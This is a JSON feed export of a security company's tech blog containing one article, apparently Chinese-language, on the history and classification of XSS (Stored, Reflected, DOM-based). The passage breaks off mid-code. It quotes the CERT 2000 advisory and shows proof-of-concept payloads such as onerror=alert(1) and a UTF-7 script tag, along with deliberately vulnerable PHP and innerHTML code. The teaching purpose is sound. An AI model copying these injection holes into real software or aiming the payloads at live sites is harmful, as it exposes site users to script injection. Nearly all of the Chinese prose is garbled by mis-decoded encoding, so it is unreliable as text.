{
  "version": "https://jsonfeed.org/version/1",
  "title": "Cymetrics Tech Blog",
  "home_page_url": "https://tech-blog.cymetrics.io",
  "feed_url": "https://tech-blog.cymetrics.io/feed/feed.json",
  "description": "Cymetrics Tech Blog",
  "author": {
    "name": "Cymetrics Tech Blog",
    "url": ""
  },
  "items": [{
      "id": "https://tech-blog.cymetrics.io/posts/huli/xss-history/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/xss-history/",
      "title": "XSS å¾é ­è«‡èµ·ï¼šæ­·å²èˆ‡ç”±ä¾†",
      "content_html": "<p>æˆ‘ä»¥å‰æœ‰å¯«éä¸€äº›é—œæ–¼ XSS çš„æ–‡ç« ï¼Œä¸»è¦åœ¨è«‡çš„æ˜¯å¯¦ä½œé¢çš„é˜²ç¯„ä»¥åŠé˜²ç¦¦çš„å„å€‹ç´°ç¯€ï¼š</p>\n<ol>\n<li><a href=\"https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/\">é˜²æ­¢ XSS å¯èƒ½æ¯”æƒ³åƒä¸­å›°é›£</a></li>\n<li><a href=\"https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/\">æ·ºè«‡ XSS æ”»æ“Šèˆ‡é˜²ç¦¦çš„å„å€‹ç’°ç¯€</a></li>\n</ol>\n<!-- summary -->\n<p>é€™ç¯‡åŸæœ¬æƒ³å¯«çš„æ˜¯ XSS çš„åŸºç¤ï¼Œå°±å¤§å®¶éƒ½è½éçš„é‚£ä¸‰ç¨®é¡åˆ¥ï¼šStored(Persistent)ã€Reflected(Non-Persistent) ä»¥åŠ DOM-based XSSï¼Œä½†ç•¶æˆ‘æ­£è¦é–‹å§‹å¯«çš„æ™‚å€™ï¼Œè…¦ä¸­çªç„¶æµ®ç¾äº†å¹¾å€‹å•é¡Œï¼šã€ŒXSS æ˜¯ä»€éº¼æ™‚å€™å‡ºç¾çš„ï¼Ÿé€™ä¸‰ç¨®é¡åˆ¥åˆæ˜¯ä»€éº¼æ™‚å€™é–‹å§‹è¢«åˆ†é¡çš„ï¼Ÿã€</p>\n<p>å› æ­¤ï¼Œæˆ‘èŠ±äº†é»æ™‚é–“æ‰¾äº†ä¸€äº›è³‡æ–™ï¼Œé€™ç¯‡æ–‡ç« æœƒè·Ÿå¤§å®¶è«‡è«‡ XSS çš„æ­·å²ï¼Œè®“æˆ‘å€‘ä¸€èµ·æ›´äº†è§£ XSS çš„å‰ä¸–ä»Šç”Ÿã€‚</p>\n<!-- summary -->\n<h2 id=\"xss-%E7%9A%84%E8%AA%95%E7%94%9F\"><a class=\"direct-link\" href=\"#xss-%E7%9A%84%E8%AA%95%E7%94%9F\">#</a> XSS çš„èª•ç”Ÿ</h2>\n<p>å¾å¾®è»Ÿçš„ MSDN blog åœ¨ 2009 å¹´ 12 æœˆç™¼ä½ˆçš„æ–‡ç« æ¨™é¡Œï¼š<a href=\"https://web.archive.org/web/20100723152801/http://blogs.msdn.com/b/dross/archive/2009/12/15/happy-10th-birthday-cross-site-scripting.aspx\">Happy 10th birthday Cross-Site Scripting!</a> ä¸­å°±å¯ä»¥çœ‹å‡º XSSï¼ˆCross-Site Scriptingï¼‰é€™å€‹åè©ç´„è«æ˜¯ 1999 å¹´ 12 æœˆèª•ç”Ÿçš„ï¼Œé›¢ç¾åœ¨å·²ç¶“ 20 å¹¾å¹´äº†ã€‚</p>\n<p>ï¼ˆä¸‹åœ–ç‚ºä¸Šé¢é€£çµçš„æˆªåœ–ï¼‰</p>\n<p><img src=\"/img/posts/huli/xss-history/xss-10years.png\" alt=\"xss-history\"></p>\n<p>åŸæ–‡æœ€å¾Œæœ‰é€™éº¼ä¸€æ®µè©±ï¼š</p>\n<blockquote>\n<p>Let's hope that ten years from now we'll be celebrating the death, not the birth, of Cross-Site Scripting!</p>\n</blockquote>\n<p>å¾ˆéºæ†¾çš„ï¼Œ2009 å¹´çš„ 10 å¹´å¾Œï¼Œä¹Ÿå°±æ˜¯ 2019 å¹´ï¼ŒXSS ä¾èˆŠæŒçºŒæ´»èºè‘—ï¼Œåœ¨ 2017 å¹´çš„ OWASP top 10 æ’åœ¨ç¬¬ä¸ƒåï¼Œ2021 çš„ç‰ˆæœ¬å‰‡ä½µå…¥ç¬¬ä¸‰å Injection çš„é¡åˆ¥ã€‚</p>\n<p>è€Œæ–‡ä¸­æåˆ°çš„ï¼š<a href=\"https://web.archive.org/web/20100516115740/http://www.cert.org/advisories/CA-2000-02.html\">CERTÂ® Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests</a>ï¼Œå¯ä»¥è®“æˆ‘å€‘ä¸€çªºæœ€æ—©æœŸ XSS çš„é¢è²Œã€‚åº•ä¸‹å°±è®“æˆ‘å€‘ç°¡å–®çœ‹ä¸€ä¸‹é€™å€‹ç¶²é çš„å…§å®¹ï¼š</p>\n<blockquote>\n<p>A web site may inadvertently include malicious HTML tags or script in a dynamically generated page based on unvalidated input from untrustworthy sources. This can be a problem when a web server does not adequately ensure that generated pages are properly encoded to prevent unintended execution of scripts, and when input is not validated to prevent malicious HTML from being presented to the user.</p>\n</blockquote>\n<p>åœ¨ Overview çš„éƒ¨åˆ†å…¶å¯¦å°±æŠŠ XSS çš„æ ¸å¿ƒæ¦‚å¿µè¬›å¾—éå¸¸æ¸…æ¥šäº†ï¼Œserver æ²’æœ‰é©—è­‰è¼¸å…¥æˆ–æ˜¯ç·¨ç¢¼ï¼Œå°è‡´æ”»æ“Šè€…å¯ä»¥æ’å…¥ä¸€äº›æƒ¡æ„çš„ HTML æ¨™ç±¤æˆ–æ˜¯ scriptã€‚</p>\n<blockquote>\n<p>Malicious code provided by one client for another client</p>\n<p>Sites that host discussion groups with web interfaces have long guarded against a vulnerability where one client embeds malicious HTML tags in a message intended for another client. For example, an attacker might post a message like <code>Hello message board. This is a message.&lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;This is the end of my message.</code></p>\n<p>When a victim with scripts enabled in their browser reads this message, the malicious code may be executed unexpectedly. Scripting tags that can be embedded in this way include <code>&lt;SCRIPT</code>&gt; <code>&lt;OBJECT&gt;</code>, <code>&lt;APPLET&gt;</code>, and <code>&lt;EMBED&gt;</code>.</p>\n<p>When client-to-client communications are mediated by a server, site developers explicitly recognize that data input is untrustworthy when it is presented to other users. Most discussion group servers either will not accept such input or will encode/filter it before sending anything to other readers.</p>\n</blockquote>\n<p>é€™ä¸€æ®µå‰‡æ˜¯å¾Œä¾†è¢«ç¨±ç‚ºã€ŒStored XSSï¼ˆä¹Ÿç¨±ç‚º Persistent XSSï¼‰ã€çš„åˆ†é¡ï¼Œå‡è¨­æœ‰ä¸€å€‹è¨è«–å€å¯ä»¥è®“äººç•™è¨€ï¼Œä¸€å€‹æƒ¡æ„çš„æ”»æ“Šè€…å¯ä»¥ç•™é€™æ¨£çš„å…§å®¹ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\">Hello message board. This is a message.<br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SCRIPT</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">malicious code</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>SCRIPT</span><span class=\"token punctuation\">></span></span><br>This is the end of my message.</code></pre>\n<p>ç•¶å…¶ä»–ä½¿ç”¨è€…çœ‹åˆ°é€™ç¯‡ç•™è¨€çš„æ™‚å€™ï¼Œå› ç‚ºç•™è¨€è£¡é¢æœ‰ <code>&lt;script&gt;</code> ï¼Œæ‰€ä»¥å°±æœƒåŸ·è¡Œæ”»æ“Šè€…æ‰€ç•™ä¸‹çš„ JavaScript ç¨‹å¼ç¢¼ã€‚</p>\n<p>é™¤äº†é€™å€‹ä»¥å¤–ï¼Œ<code>&lt;object&gt;</code>ã€<code>&lt;applet&gt;</code> è·Ÿ <code>&lt;embed&gt;</code> ä¹Ÿéƒ½å¯ä»¥ç”¨ä¾†åŸ·è¡Œ JavaScriptï¼ˆè©±èªª applet é€™æ¨™ç±¤æ‡‰è©²å·²ç¶“æ²’ç”¨äº†ï¼Œå¯åƒè€ƒï¼š<a href=\"https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/\">Donâ€™t break the Webï¼šä»¥ SmooshGate ä»¥åŠ keygen ç‚ºä¾‹ </a>ï¼‰ã€‚</p>\n<blockquote>\n<p>Malicious code sent inadvertently by a client for itself</p>\n<p>Many Internet web sites overlook the possibility that a client may send malicious data intended to be used only by itself. This is an easy mistake to make. After all, why would a user enter malicious code that only the user will see?</p>\n<p>However, this situation may occur when the client relies on an untrustworthy source of information when submitting a request. For example, an attacker may construct a malicious link such as <code>&lt;A HREF=&quot;http://example.com/comment.cgi? mycomment=&lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;&quot;&gt; Click here&lt;/A&gt;</code></p>\n<p>When an unsuspecting user clicks on this link, the URL sent to <a href=\"http://example.co\">example.co</a> includes the malicious code. If the web server sends a page back to the user including the value of mycomment, the malicious code may be executed unexpectedly on the client. This example also applies to untrusted links followed in email or newsgroup messages.</p>\n</blockquote>\n<p>é€™ä¸€æ®µå°±å¾ˆæœ‰è¶£äº†ï¼Œæ¨™é¡Œæ˜¯ï¼šã€ŒMalicious code sent inadvertently by a client for itselfã€ï¼Œç™¼é€çš„å…§å®¹åŸºæœ¬ä¸Šåªæœ‰è‡ªå·±èƒ½çœ‹åˆ°ã€‚</p>\n<p>ä¾‹å¦‚èªªç¶²å€ä¸­ mycomment é€™å€‹åƒæ•¸æœƒåæ˜ åˆ°ç•«é¢ä¸Šï¼Œæ‰€ä»¥åƒæ˜¯ <code>http://example.com/comment.cgi?mycomment=123</code>ï¼Œç•«é¢ä¸Šé¢å°±æœƒå‡ºç¾ 123ã€‚</p>\n<p>ä½†åªæœ‰è‡ªå·±èƒ½çœ‹åˆ°èƒ½åšä»€éº¼å‘¢ï¼Ÿ</p>\n<p>å› ç‚ºæ˜¯é€éç¶²å€ä¸Šçš„ query string ä¾†å‚³éè³‡è¨Šï¼Œå› æ­¤å¯ä»¥ç”¢ç”Ÿé€™æ¨£çš„ä¸€å€‹é€£çµï¼š<code>http://example.com/comment.cgi?mycomment=&lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;</code>ï¼Œæ¥è‘—å†æŠŠé€™å€‹é€£çµå‚³çµ¦å…¶ä»–äººï¼Œç•¶å…¶ä»–äººé»äº†ä»¥å¾Œï¼Œç•«é¢ä¸Šå°±æœƒå‡ºç¾ <code>&lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;</code>ï¼Œç…§æ¨£é”æˆ XSSã€‚</p>\n<p>é€™å°±æ˜¯ XSS çš„å¦å¤–ä¸€ç¨®åˆ†é¡ï¼šReflected XSSï¼Œä½ çš„è¼¸å…¥æœƒåæ˜ åœ¨ç•«é¢ä¸Šã€‚</p>\n<p>è€Œé€™å…©ç¨®çš„å·®åˆ¥åœ¨æ–¼ Stored XSS å°±åƒå®ƒçš„åå­—ä¸€æ¨£ï¼ŒXSS payload æ˜¯è¢«ä¿å­˜ä½çš„ï¼Œä»¥è¨è«–å€ä¾†èªªï¼Œæ–‡ç« æ˜¯ä¿å­˜åœ¨è³‡æ–™åº«ä¸­çš„ï¼Œè€Œ Reflected XSS å‰‡ä¸ç„¶ã€‚</p>\n<p>ä»¥ PHP ç‚ºä¾‹ï¼ŒReflected XSS çš„ç¨‹å¼ç¢¼å¯èƒ½æœƒåƒé€™æ¨£ï¼š</p>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span><br>   <span class=\"token variable\">$comment</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'comment'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br><span class=\"token delimiter important\">?></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?=</span> <span class=\"token variable\">$comment</span> <span class=\"token delimiter important\">?></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>æŠŠ GET çš„åƒæ•¸ç›´æ¥åæ˜ åœ¨ç•«é¢ä¸Šï¼Œæ‰€ä»¥æ¯ä¸€æ¬¡éƒ½å¿…é ˆé€é comment é€™å€‹åƒæ•¸æŠŠ payload å‚³é€²å»ï¼Œå¦å‰‡ä¸æœƒè§¸ç™¼ XSSã€‚</p>\n<p>ä»¥ä¸Šé¢æçš„ã€Œè¨è«–å€ã€é€™å€‹ç¶²ç«™ç‚ºä¾‹ï¼ŒStored XSS çš„ç ´å£åŠ›æ‡‰è©²æ˜¯æ›´å¼·å¤§çš„ï¼Œå› ç‚ºåªè¦é»é€²å»ä½ é€™ç¯‡æ–‡ç« å°±æœƒä¸­æ‹›ï¼Œå¯ä»¥æƒ³æˆä½ åœ¨ ptt ç™¼äº†ä¸€ç¯‡æ–‡ç« ï¼Œåªè¦æœ‰é„‰æ°‘é»é€²ä¾†æ–‡ç« å°±æœƒè¢«æ”»æ“Šï¼Œé‚„æ»¿å®¹æ˜“è§¸ç™¼çš„ã€‚</p>\n<p>ä½† Reflected XSS å°±ä¸å¤ªä¸€æ¨£äº†ï¼Œé€™éœ€è¦ä½¿ç”¨è€…é»æ“Šé€£çµæ‰æœƒå‡ºäº‹ï¼Œåƒæ˜¯ä½ åœ¨ ptt æ¨æ–‡ç•™äº†ä¸€å€‹é€£çµï¼Œé„‰æ°‘è¦ä¸»å‹•é»é‚£å€‹é€£çµæ‰èƒ½è§¸ç™¼ XSSã€‚</p>\n<p>æ–‡ä¸­çš„å…¶ä»–éƒ¨åˆ†ä¹Ÿå¾ˆæœ‰è¶£ï¼Œä¾‹å¦‚èªªä¹Ÿæœ‰æåˆ°åƒ…ç®¡æŠŠ JavaScript disabledï¼Œä¾ç„¶å¯ä»¥ç”¨ HTML èˆ‡ CSS å»ç«„æ”¹ç•«é¢ç­‰ç­‰ï¼Œä¹Ÿæœ‰æåˆ°ä¿®è£œæ–¹å¼ï¼Œåœ¨é€™é‚Šï¼š<a href=\"https://web.archive.org/web/20100527204457/http://www.cert.org/tech_tips/malicious_code_mitigation.html\">Understanding Malicious Content Mitigation for Web Developers</a></p>\n<p>ä¿®è£œæ–¹å¼é™¤äº†æˆ‘å€‘ç†Ÿæ‚‰çš„é‡å°å…§å®¹ç·¨ç¢¼ä»¥å¤–ï¼Œé‚„æœ‰å¦ä¸€å€‹æ˜¯è¦ã€ŒæŒ‡å®šç·¨ç¢¼æ–¹å¼ã€ï¼Œé€™é‚Šçš„ç·¨ç¢¼æŒ‡çš„æ˜¯ UTF-8 æˆ–æ˜¯ ISO-8859-1 ä»¥åŠ big5 é€™ç¨®ç·¨ç¢¼ã€‚é›–ç„¶èªªç¾åœ¨é€™å€‹å¹´ä»£çµ•å¤§éƒ¨åˆ†ç¶²ç«™éƒ½æ˜¯ UTF-8 äº†ï¼Œä½†æ—©æœŸå…¶å¯¦ä¸ç„¶ã€‚åœ¨ä»¥å¾€ç€è¦½å™¨é‚„æ”¯æ´åƒæ˜¯ UTF-7 é€™æ¨£çš„ç·¨ç¢¼æ–¹å¼ï¼Œå°±ç®—ä¸ç”¨ä¸€äº›ç‰¹æ®Šå­—å…ƒä¹Ÿå¯ä»¥é”æˆ XSSï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>test page<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>  +ADw-script+AD4-alert(1)+ADw-/script+AD4-<br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>ç¯„ä¾‹å–è‡ªï¼š<a href=\"https://wooyun.js.org/drops/XSS%E5%92%8C%E5%AD%97%E7%AC%A6%E9%9B%86%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.html\">XSS å’Œå­—ç¬¦é›†çš„é‚£äº›äº‹å…’</a>ï¼Œè£¡é¢æœ‰æåˆ°æ›´å¤šé€™ç¨®é¡ä¼¼çš„å•é¡Œï¼Œä½†å¤§å¤šæ•¸å•é¡Œæ‡‰è©²éƒ½ç™¼ç”Ÿåœ¨æ¯”è¼ƒæ—©æœŸçš„ç€è¦½å™¨ä¸Šé¢ã€‚</p>\n<h2 id=\"%E7%AC%AC%E4%B8%89%E7%A8%AE-xss-%E5%88%86%E9%A1%9E%E7%9A%84%E8%AA%95%E7%94%9F\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E7%A8%AE-xss-%E5%88%86%E9%A1%9E%E7%9A%84%E8%AA%95%E7%94%9F\">#</a> ç¬¬ä¸‰ç¨® XSS åˆ†é¡çš„èª•ç”Ÿ</h2>\n<p>æœ‰çœ‹é XSS æ–‡ç« çš„äººéƒ½çŸ¥é“ï¼Œæœ€å»£ç‚ºäººçŸ¥çš„ XSS åˆ†é¡å¤§æ¦‚å°±ä¸‰ç¨®ï¼š</p>\n<ol>\n<li>Stored XSSï¼ˆPersistent XSSï¼‰</li>\n<li>Reflected XSSï¼ˆNon-Persistent XSSï¼‰</li>\n<li>DOM-based XSS</li>\n</ol>\n<p>å†ç¹¼çºŒå¾€ä¸‹ä¹‹å‰ï¼Œæˆ‘å…ˆä¾†å•å•çœ‹å¤§å®¶å…©å€‹å•é¡Œã€‚</p>\n<p>ç¬¬ä¸€å€‹å•é¡Œï¼Œå‡è¨­ç¾åœ¨æˆ‘ç™¼äº†ä¸€ç¯‡æ–‡ç« ï¼Œå…§å®¹ç‚º <code>&lt;img src=x onerror=alert(1)&gt;</code>ï¼Œè€Œé¡¯ç¤ºæ–‡ç« çš„é é¢ç¨‹å¼ç¢¼æ˜¯é€™æ¨£çš„ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>  <span class=\"token function\">getPost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> id<span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">post</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.article'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> post<span class=\"token punctuation\">.</span>content<br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>å› ç‚ºç”¨äº† innerHTML çš„ç·£æ•…ï¼Œæ‰€ä»¥å°±æœ‰äº†ä¸€å€‹ XSS æ¼æ´ï¼Œåœ¨é€™å€‹ç‹€æ³ä¹‹ä¸‹ï¼Œæˆ‘çš„ç•™è¨€ç¢ºå¯¦æœ‰ã€Œä¿å­˜ã€åœ¨è³‡æ–™åº«ï¼Œä½†ä¹ŸåŒæ™‚ç”¨äº† DOM å»æ”¹è®Šå…§å®¹ï¼Œé‚£é€™å€‹ XSS æ‡‰è©²è¢«æ­¸é¡åœ¨ Stored XSSï¼Œé‚„æ˜¯ DOM-based XSSï¼Ÿ</p>\n<p>ç¬¬äºŒå€‹å•é¡Œï¼Œå‡è¨­ç¶²é ä¸­æœ‰ä¸€æ®µç¨‹å¼ç¢¼é•·é€™æ¨£ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>  document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".search\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token function\">decodeURIComponent</span><span class=\"token punctuation\">(</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">)</span><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>é€™é¡¯ç„¶å¯ä»¥é€é query string è£½é€ å‡ºä¸€å€‹ XSS æ¼æ´ï¼Œé€™å€‹ XSS ç¢ºå¯¦åæ˜ äº†ä½¿ç”¨è€…çš„è¼¸å…¥ï¼Œè€Œä¸”æ²’æœ‰è¢«å„²å­˜åœ¨è³‡æ–™åº«è£¡é¢ï¼Œä¸éå»æ˜¯ç”¨ DOM å»æ”¹è®Šå…§å®¹ï¼Œé‚£å®ƒæ‡‰è©²æ˜¯ Reflected XSSï¼Œé‚„æ˜¯ DOM-based XSSï¼Ÿ</p>\n<p>åœ¨ç¹¼çºŒå¾€ä¸‹é–±è®€ä¹‹å‰ï¼Œå¤§å®¶å¯ä»¥å…ˆæƒ³ä¸€ä¸‹ä¸Šé¢é€™å…©å€‹å•é¡Œã€‚</p>\n<p>å…ˆä¾†è¬›è¬›æˆ‘ä»¥å‰çš„ç­”æ¡ˆï¼Œæˆ‘ä¹‹å‰æ˜¯ç”¨ä¸‹é¢çš„å®šç¾©ä¾†åˆ†é¡é€™å¹¾å€‹çš„ï¼š</p>\n<ol>\n<li>æˆ‘çš„ XSS payloadï¼ˆä¾‹å¦‚èªª <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼‰å¦‚æœæœ‰å­˜åœ¨è³‡æ–™åº«ï¼Œé‚£å°±æ˜¯ Stored XSS</li>\n<li>å¦‚æœä¸æ˜¯ï¼Œé‚£å°±çœ‹æˆ‘çš„ payload æ˜¯ç›´æ¥å¾å¾Œç«¯è¼¸å‡ºï¼Œé‚„æ˜¯é€é DOM å»è³¦å€¼ï¼Œå‰è€…å°±æ˜¯ Reflectedï¼Œå¾Œè€…å°±æ˜¯ DOM-based</li>\n</ol>\n<p>å¾Œä¾†æˆ‘æ‰ç™¼ç¾é€™å€‹åˆ†é¡æ–¹å¼æ˜¯éŒ¯èª¤çš„ï¼Œå› ç‚ºæˆ‘è¢«ã€Œstoredã€é€™å€‹åè©èª¤å°äº†ï¼Œæ²’æœ‰æ„è­˜åˆ°é€™èƒŒå¾Œçš„æ­·å²èƒŒæ™¯ã€‚</p>\n<p>é€™æ˜¯ä»€éº¼æ„æ€å‘¢ï¼Ÿåœ¨ 1999 å¹´ XSS å‰›å‡ºä¾†çš„æ™‚å€™ï¼ŒAjax é‚„ä¸å­˜åœ¨ï¼ˆå®ƒæ˜¯ 2005 å¹´æ‰èª•ç”Ÿçš„ï¼‰ï¼Œæ‰€ä»¥å‰å¾Œç«¯çš„è³‡æ–™äº¤æ›æ‡‰è©²éƒ½æ˜¯é€éè¡¨å–®é€å» Serverï¼Œä¸¦ä¸”ç›´æ¥æŠŠå›æ‡‰ render å‡ºä¾†ã€‚</p>\n<p>æ›å¥è©±èªªï¼Œåœ¨ 1999 å¹´çš„æ™‚å€™ï¼ŒåŸºæœ¬ä¸Šæ²’æœ‰ä»€éº¼æ“ä½œæ˜¯ç”¨ JavaScript å»æ›´æ”¹ç•«é¢å…§å®¹çš„ï¼Œå°±ç®—æœ‰ï¼Œä¹Ÿæ˜¯ä¸€äº›æ¯”è¼ƒç„¡é—œç·Šè¦çš„æ“ä½œã€‚ä½†åœ¨ 2021 å¹´éƒ½ä¸ä¸€æ¨£äº†ï¼Œåœ¨é€™å€‹ SPA ç››è¡Œçš„å¹´ä»£ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯é€é JavaScript å»å‘¼å« APIï¼Œæ‹¿åˆ°è³‡æ–™ä»¥å¾Œå†å»æ›´æ”¹ç•«é¢ï¼Œå¾Œç«¯åªè² è²¬æä¾›è³‡æ–™ï¼Œå‰ç«¯é è‘— JavaScript ä¾† renderï¼Œé€™è·Ÿ 20 å¹´å‰å®Œå…¨ä¸åŒã€‚</p>\n<p>XSS çš„ä¸‰ç¨®åˆ†é¡ä¹‹ä¸­ï¼Œå‰å…©ç¨® Stored ä»¥åŠ Reflected åœ¨ XSS èª•ç”Ÿä¹‹æ™‚å°±å·²ç¶“å­˜åœ¨äº†ï¼Œè€Œç¬¬ä¸‰ç¨®å‰‡æ™šäº†äº”å¹´æ‰å‡ºç¾ï¼ˆé€™é‚Šçš„ã€Œå‡ºç¾ã€æŒ‡çš„æ˜¯æœ‰å€‹åè©æˆ–åˆ†é¡ä¾†å®šç¾©å®ƒï¼Œè€Œä¸æ˜¯æŒ‡æ”»æ“Šå‡ºç¾ï¼‰ï¼Œå‡ºè™•æ‡‰è©²æ˜¯é€™ä¸€ç¯‡ï¼š<a href=\"http://www.webappsec.org/projects/articles/071105.shtml\">DOM Based Cross Site Scripting or XSS of the Third Kind</a></p>\n<p>æ–‡ä¸­çš„ Introduction æœ‰é€™æ¨£ä¸€å€‹æ®µè½ï¼š</p>\n<blockquote>\n<p>XSS is typically categorized into â€œnon-persistentâ€ and â€œpersistentâ€ (â€œreflectedâ€ and â€œstoredâ€ accordingly, as defined in [4]). â€œNon-persistentâ€ means that the malicious (Javascript) payload is echoed by the server in an immediate response to an HTTP request from the victim. â€œPersistentâ€ means that the payload is stored by the system, and may later be embedded by the vulnerable system in an HTML page provided to a victim.</p>\n</blockquote>\n<p>é‡é»æ˜¯ Stored è·Ÿ Reflected é€™å…©å€‹åˆ†é¡éƒ½æœ‰ä¸€å€‹å‰æï¼šã€Œpayload æ˜¯ç”±å¾Œç«¯ç›´æ¥ render çš„ã€ï¼Œè€Œé€™ç¯‡æ–‡ç« æ‰€æåˆ°çš„ç¬¬ä¸‰å€‹åˆ†é¡ DOM-basedï¼ŒæŒ‡çš„å‰‡æ˜¯ã€Œpayload æ˜¯ç”±å‰ç«¯ render å‡ºä¾†çš„ã€ï¼Œé€™å°±æ˜¯ç¬¬ä¸‰ç¨®èˆ‡å‰å…©ç¨®çš„æœ€å¤§å·®ç•°ã€‚</p>\n<p>åœ¨åˆ¤åˆ¥ XSS çš„æ™‚å€™ï¼Œæ‡‰è©²å…ˆç¢ºèªçš„å…¶å¯¦æ˜¯ã€Œpayload æ˜¯å‰ç«¯é‚„æ˜¯å¾Œç«¯ renderï¼Ÿã€ï¼Œå¦‚æœæ˜¯å‰ç«¯ render å‡ºä¾†ï¼Œä¸è«–è³‡æ–™å¾å“ªè£¡ä¾†ï¼ˆå¾è³‡æ–™åº«æˆ–æ˜¯ç¶²å€æˆ–ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥ï¼‰ï¼Œå°±æ˜¯ DOM-based XSSã€‚å¦‚æœæ˜¯å¾Œç«¯ render å‡ºä¾†ï¼Œæ‰å»å€åˆ†æ˜¯ Stored é‚„æ˜¯ Reflectedã€‚</p>\n<p>å› æ­¤ï¼Œå‰›å‰›é‚£å…©å€‹å•é¡Œå› ç‚ºéƒ½æ˜¯å‰ç«¯ render çš„é—œä¿‚ï¼Œéƒ½æœƒè¢«æ­¸é¡åœ¨ DOM-based XSSã€‚</p>\n<p>ä¸Šé¢çš„æ–‡ç« ä¸­å°±æœ‰èˆ‰ä¸€å€‹é¡ä¼¼çš„ä¾‹å­ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>HTML</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>TITLE</span><span class=\"token punctuation\">></span></span>Welcome!<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>TITLE</span><span class=\"token punctuation\">></span></span><br>Hi<br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SCRIPT</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br><span class=\"token keyword\">var</span> pos<span class=\"token operator\">=</span>document<span class=\"token punctuation\">.</span><span class=\"token constant\">URL</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name=\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">5</span><span class=\"token punctuation\">;</span><br>document<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token 